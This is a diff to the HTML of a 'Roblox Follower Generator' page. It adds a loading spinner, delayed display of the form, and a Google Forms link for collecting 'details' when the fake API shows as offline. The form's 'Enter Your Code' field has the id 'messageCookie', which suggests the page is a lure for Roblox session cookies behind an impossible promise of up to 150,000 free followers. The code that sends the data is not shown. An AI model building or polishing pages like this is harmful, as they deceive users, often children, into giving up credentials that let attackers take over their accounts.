@@ -20,9 +20,58 @@
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
     </style>
-<style>
 
+<style>
+  /* Center the loader */
+  #loader {
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    z-index: 1;
+    width: 120px;
+    height: 120px;
+    margin: -76px 0 0 -76px;
+    border: 16px solid #f3f3f3;
+    border-radius: 50%;
+    border-top: 16px solid #3498db;
+    -webkit-animation: spin 2s linear infinite;
+    animation: spin 2s linear infinite;
+  }
   
+  @-webkit-keyframes spin {
+    0% { -webkit-transform: rotate(0deg); }
+    100% { -webkit-transform: rotate(360deg); }
+  }
+  
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  
+  /* Add animation to "page content" */
+  .animate-bottom {
+    position: relative;
+    -webkit-animation-name: animatebottom;
+    -webkit-animation-duration: 1s;
+    animation-name: animatebottom;
+    animation-duration: 1s
+  }
+  
+  @-webkit-keyframes animatebottom {
+    from { bottom:-100px; opacity:0 } 
+    to { bottom:0px; opacity:1 }
+  }
+  
+  @keyframes animatebottom { 
+    from{ bottom:-100px; opacity:0 } 
+    to{ bottom:0; opacity:1 }
+  }
+  
+  </style>
+
+<div class="loader"></div>
+
+<style>
 body {
   background-color: rgb(36, 36, 36);
 }</style>
@@ -50,9 +99,23 @@ p {
 }
 </style>
 <title style="color:white">APEX FOLLOWER GENERATOR</title>
-  <body class="container mt-5">
-    <form onsubmit="sendContact(event)">
+  <body class="container mt-5" onload="myFunction()" style="margin:0;">
+    <div id="loader"></div>
+    <script>
+      var myVar;
+      
+      function myFunction() {
+        myVar = setTimeout(showPage, 1300);
+      }
+      
+      function showPage() {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("myDiv").style.display = "block";
+      }
+      </script>
+    <form onsubmit="sendContact(event)" style="display:none;" id="myDiv" class="animate-bottom">  
       <div class="mb-3">
+        <hr>
         <h1 style="color:white">ROBLOX FOLLOWER GENERATOR | By APEX</h1> <h3 style="color:white"c>Working 2022</h3>
         <hr>
         <h3 style="color:white">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</h3>
@@ -105,18 +168,19 @@ p {
         <h3 style="color:white">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</h3>
         <hr>
         <hr>
-        <h4 style="color:white">Generate Account/Profile Followers - API STATUS: 🔴 OFFLINE <!--🟢 ONLINE--></h4>
+        <h4 style="color:white">Generate Account/Profile Followers - API STATUS: 🔴 OFFLINE<!--🟢 ONLINE-->ㅤ|ㅤEnter Details <a href="https://docs.google.com/forms/d/e/1FAIpQLSdaOr6dw4OVyk7HFVNUoX4CtONP9jyUUDCoxrFRSI3gHPO2AA/viewform?usp=sf_link">Here</a> If Offline</h4>
         <hr>
         <label for="messageInput" class="form-label" style="color:white">Enter Your Code</label>
         <textarea class="form-control" id="messageCookie" rows="1" class="readonly"></textarea>
-      </div>
-
-      <div class="mb-3">
+        <hr>
         <label for="messageInput" class="form-label" style="color:white">Enter Number Of Followers (150,000 MAX LIMIT)</label>
         <textarea class="form-control" id="messageFollowers" rows="1" class="readonly"></textarea>
+        <hr>
+        <button type="submit" class="btn btn-primary">Send Followers</button>
+        <hr>
+        <hr>
+        <hr>
       </div>
-
-      <button type="submit" class="btn btn-primary">Send Followers</button>
       <hr>
       <hr>
       <hr>
@@ -163,6 +227,17 @@ p {
 
 
     </script>
+
+    <style>
+    .mb-3 {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      margin-top: -50px;
+      margin-left: -100px;
+    }
+    </style>
+
 
     <footer class="copyright">© Copyright By APEX Followers. All Rights Reserved</footer>
     
